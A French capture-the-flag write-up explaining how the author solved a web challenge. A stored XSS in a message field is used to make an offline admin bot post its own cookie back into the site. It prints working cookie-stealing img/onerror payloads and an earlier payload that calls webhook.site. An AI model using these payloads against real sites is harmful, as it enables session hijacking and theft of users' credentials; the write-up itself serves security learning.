

![](../img/Pasted%20image%2020260517122449.png)

Dans ce challenge nous pouvons voir un petit lore sympa créé par rootcan (merci encore pour ce challenge qui ma casser la tête haha).

Nous pouvons voir que signaler un problème nous permet donc de faire cliquez ou de faire chargé la page à un administrateur(ici un bot admin) il nous ai précisé que le bot n'as accès à internet. Pour des raisons de sécurité mais aussi pour un vrai challenge bien dur haha. On va devoir donc faire ce qu'on appel du same origin et faire en sorte que le bot admin fasse tout de lui même ou soit renvoie son cookie.

*NB* : *Vous verrez que plusieurs fois je parle de same origin en réalité ce n'est pas ça le terme, le terme de same origin est utiliser plutôt pour le SOP (same origin policy) qui permet de faire en sorte que tout requête etc... ne marche que si cela reste dans le contexte du site. par exemple le header script-src : same-origin  tout cela appartient au SOP. Or ici j'utiliserais ce terme pour dire que nous faisons en sorte que rien ne se fasse via une ressource sur internet comme webhook.site etc... . Pour plus d'information sur les SOP voici un lien :* https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy



Comment on peut-être sûr que ce sera le chemin du cookie à prendre ? 

Grâce à cette phrase : 

`_Signaler un problème" vous permettra d'amener un admin possédant un cookie plutôt intéressant sur la page_`


Tout d'abord voyons voir à quoi ressemble le site web qui nous ai mis à notre disposition.

![](../img/Pasted%20image%2020260517123901.png)
![](../img/Pasted%20image%2020260517124000.png)

On peut voir que tout d'abord il faut établir le lien(qui on verra nous servira à quelques chose)

Puis deuxième étape il faut transmettre une dépêche qui celui ci sera lisible dans les dépêche reçu. 
Nous pouvons mettre test par exemple pour voir la dépêche reçu.

![](../img/Pasted%20image%2020260517124844.png)


Essayons de faire une XSS classique pour voir si le champs est vulnérable.

Mais avant tout cela, si vous avez des lacunes aux niveaux des XSS je vous conseilles d'en découvrir plus via ce lien de PortSwigger : 
https://portswigger.net/web-security/cross-site-scripting

Maintenant regardons si le champs est vulnérable ou non. 

![](../img/Pasted%20image%2020260517141744.png)

Ici le "> permet d'échapper à la balise "li" dans laquelle notre input est mis. 
![](../img/Pasted%20image%2020260517141834.png)

par la suite on peut mettre du script. Le plus parlant est d'utiliser l'option alert qui vous permet de voir une popup sauf que si vous faite un reload du site vous verrez que cela se ré-exécutera ce qui est un peu troublant.

On sais que le bot admin n'as pas accès à Internet au moment des différents tests cela n'était pas préciser j'avais donc essayer des payload simple et classique tel que : 

```javascript
"><script>fetch("https://webhook.site/[votre_id]?c=");</script>
```

Mais maintenant que cela est préciser, cela va me permettre de raccourcie grandement votre temps de lecture au niveau de mon write-up (compte rendu). 

Bon essayons de voir s'il n'y as pas un endpoint qui peut-être intéressant. Car oui nous avons vu qu'il y a une XSS mais qu'on ne peux pas récupérer les cookies du bot admin comme cela puisque le bot n'as pas accès à internet donc le XSS basic vers un webhook n'est pas possible.

Essayons de trouver un endpoint qui peut nous aider et essayons de voir un peu les différents code sources qui sont à notre disposition sur le site : 

![](../img/Pasted%20image%2020260517145540.png)

Tiens tiens tiens, un script est importé mais aussi une fonction est utiliser setTokenAcquired.  
![](../img/Pasted%20image%2020260517145741.png)


On peut voir qu'on nous donne un token de type csrf qui ce situe dans le /api/init_csrf. On peut donc pensez qu'il faudra récupérer les informations du bot admin lorsqu'il va chercher sont token csrf et donc le récupérer. 

On peut voir aussi qu'il y a une fonction qui est notre fameux boutons pour notifier l'administrateur qui se situe au /visit.

Bon essayons de chargé une XSS par une balise image. 

```javascript
"><img src=x onerror="console.log('test2');"</img>
```

![](../img/Pasted%20image%2020260517150336.png)

Okay parfait maintenant nous allons rester sur cela car voici ce qui va se passer : 

On met notre payload XSS => l'image ce charge dans le champs dépêches reçues => La source de l'image n'existe pas => On exécute le script qui est dans le onerror. 

Maintenant il faut faire en sorte de récupérer les cookies du bot admin. Pour cela nous allons particulièrement utiliser fetch qui permet aussi de manipuler via Javascript les différents champs comme les Headers HTTP mais aussi le Body etc... 

Récap de ce qui se passe lors d'un signalement. 

![](../img/Pasted%20image%2020260517175457.png)



Maintenant voyons voir à quoi va ressembler la solution finale et ce qui est attendu via un dessin : 

![](../img/Pasted%20image%2020260517180433.png)

![](../img/Pasted%20image%2020260517180603.png)

Ceci est pour l'instant qu'une hypothèse et nous allons essayer de faire en sorte que cela deviennent la solution haha

Pour cela nous allons utiliser fetch et le langage Javascript. Je vous invite à allez lire plus en détail comment fonctionnent fetch et de c'est différentes options cela vous permettra de comprendre facilement le payload finale ci dessous.

https://developer.mozilla.org/fr/docs/Web/API/Fetch_API/Using_Fetch

Vous y trouverez toutes les informations liée à fetch notamment le 

Solution finale : 

```javascript
<img src=x onerror="fetch('/api/init_csrf',{credentials:'include'}).then(()=>fetch('/flag',{credentials:'include'})).then(()=>{var flag_cookie=document.cookie;fetch('/post_comment',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'comment=FLAG='+encodeURIComponent(flag_cookie)})})">
<img src=x onerror="fetch('/api/init_csrf',{credentials:'include'}).then(request=>{var flag_cookie=request.headers.get('set-cookie');fetch('/post_comment',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'comment=FLAG='+encodeURIComponent(flag_cookie)})})">
```


La deuxième XSS ne marche pas puisque j'essaye d'accéder à un Set-Cookie ce qui n'est accessible que par le navigateur et non par Javascript c'est pour cela qu'on va garder que le bon payload 


Le bon payload pour la solution finale est la suivante : 

```javascript
"><img src=x onerror="fetch('/api/init_csrf',{credentials:'include'}).then(()=>fetch('/flag',{credentials:'include'})).then(()=>{var flag_cookie=document.cookie;fetch('/post_comment',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'comment=FLAG='+encodeURIComponent(flag_cookie)})})"></img>
```

Dans ce payload on crée une image qui n'as pas de source toujours pour faire en sorte que ça passe à l'execution du oneerror, lorsque cela est fait on récupère les informations du fichier /api/init_csrf donc le token CSRF du bot, on récupere c'est credentials quand cela est fait on récupere les information de la page /flag qui lui modifie le cookie du bot avec celui du flag

Mais qu'est-ce que les credentials ? c'est "une preuve d'identité par exemple un mot de passe, des données biométrique ou autre. vous pouvez retrouver.  

Dans le cadre de l'API Fetch, un identifiant est une donnée supplémentaire envoyée avec la requête et que le serveur peut utiliser pour authentifier l'utilisateur. Tous les éléments suivants sont considérés comme des identifiants
- HTTP cookies
- [TLS](https://developer.mozilla.org/en-US/docs/Glossary/TLS) client certificates
- The [`Authorization`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Authorization) and [`Proxy-Authorization`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Proxy-Authorization) headers.

Pour plus d'information : 

https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch#including_credentials




Pour le code du POST j'ai repris les grands principes qui sont aussi dans le lien : 

![](../img/Pasted%20image%2020260517181943.png)

Si certains ce pose la question pourquoi j'ai mis "Content-Type" : "application/x-www-form-urlencoded" car c'est ce type de contenu qui faut mettre lorsqu'on fait un Content-Type via cette méthode.



Et enfin on POST toute c'est informations dans les dépêche en créant une requête POST vers la page /post_comment qui est là où tout les dépêches passe pour savoir si l'utilisateur à bel est bien un token csrf si ce n'est pas le cas nous obtenons une erreur. 

![](../img/Pasted%20image%2020260517173137.png)

Et ont voit bel est bien que nous avons : 

![](../img/Pasted%20image%2020260517173156.png)

Il faut donc que l'utilisateur à un token CSRF propre à lui avant que le POST ce fasse. 

Pour voir si c'est bien dans le /post_comment qu'il faut renvoyer nous allons utiliser Burpsuite et faire une requête POST vers l'url /post_comment


![](../img/Pasted%20image%2020260517173703.png)


On peut voir qu'on à été redirigé vers la racine du site donc on à bel est bien post. 

Lançon maintenant notre payload finale. 

![](../img/Pasted%20image%2020260517182547.png)


Cliquez sur envoyer la Dépêche puis sur Signaler un problème en bas de la page et rechargé la page.

![](../img/Pasted%20image%2020260517182636.png)

Bingo ! 

Merci encore pour ce CTF qui ma permis de voir une autre façon de faire des XSS en same origin que je n'avais jamais encore fait. 

Pour plus d'information sur le créateur allez voir son Github il fait des projets plutôt pas mal. 

[tornac1234 (rootcan) · GitHub](https://github.com/tornac1234)

